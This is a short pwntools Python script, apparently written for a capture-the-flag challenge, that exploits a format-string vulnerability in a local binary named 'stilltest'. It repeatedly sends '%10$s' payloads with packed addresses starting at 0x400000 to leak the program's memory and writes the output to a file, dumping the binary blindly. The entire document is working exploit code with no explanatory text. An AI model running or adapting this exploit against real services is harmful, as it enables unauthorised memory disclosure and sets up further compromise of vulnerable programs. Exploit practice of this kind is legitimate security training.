#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'#critical/debug
p = process("./stilltest")
f = open("stilltestbin", "ab+")
#f = open("64weiba", "ab+")

begin = 0x400000
offset = 0
i=0
p.recvuntil('Please tell me:')
while True:#i<13:#True:#
	addr = begin + offset	
	p.sendline("%10$saabbccddeef" + p64(addr))
	try:
		#info = p.recv(4)
		info = p.recvuntil('aabbccddeef',drop=True)[9:]
		remain = p.recvrepeat(0.2)#recv the tail to dump in cicle
		print info.encode("hex")
		print len(info)
	except EOFError:
		print "offset is " + str(offset)
		break
	if len(info)==0:
		print "info is null"
		offset += 1
		f.write('\x00')
	else:
		info += "\x00"
		offset += len(info)
		f.write(info)
		f.flush()
	#i = i + 1
	print "offset is " + str(offset)
f.close()
p.close()
#'''